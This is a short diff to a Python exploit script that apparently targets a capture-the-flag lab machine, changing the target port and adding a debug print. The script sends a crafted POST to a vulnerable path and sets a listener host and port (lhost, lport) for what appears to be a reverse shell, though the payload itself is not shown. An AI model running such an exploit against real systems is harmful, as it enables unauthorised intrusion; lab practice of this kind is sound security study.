@@ -3,7 +3,7 @@ import sys
 import urllib3
 import base64
 
-url = "http://10.10.11.204:8000"
+url = "http://10.10.11.204:8080/"
 lhost = "10.10.16.24"
 lport = "1234"
 
@@ -31,6 +31,7 @@ vulnURL = url + path
 
 try:
     req = requests.post(url = vulnURL, headers =headers, data=data, verify=False, timeout=5)
+    print(url)
     code = req.status_code
     text = req.text
     rsp = '"error":"Internal Server Error"'
@@ -44,7 +45,7 @@ try:
 except requests.exceptions.RequestException:
     print(f'{url} timed out')
     pass
-    
+
 except:
     print(f'{url} detection/ids error/check port')
     pass
